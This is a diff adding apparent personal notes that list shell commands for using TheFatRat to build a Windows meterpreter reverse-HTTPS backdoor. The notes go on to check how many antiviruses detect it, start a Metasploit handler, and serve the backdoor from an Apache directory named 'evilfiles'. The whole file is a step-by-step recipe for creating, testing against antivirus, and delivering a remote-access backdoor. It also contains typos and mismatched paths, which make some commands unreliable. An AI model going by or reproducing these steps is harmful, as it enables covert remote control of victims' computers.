@@ -1,0 +1,36 @@
+cd /opt
+git clone https://github.com/screetsec/theFatRat.git
+ls
+cd /ThefatRat
+ls
+chmod + x setup.sh
+ls
+./setup.sh
+
+fatrat
+6
+1
+myip
+8080
+rev_https_8080_fr
+#select windows/meterpreter/reverse_https
+yes
+#go to opt/ThefatRat
+#open the output file
+backdoor is in output file copy paste it & check how many anti viruses detect it
+
+in new terminal
+
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST myip
+set LPORT 8080
+show options
+saave
+exploit
+
+#copy the backdoor in var/www/html/evilfiles
+
+#split  terminal
+service apache2 start
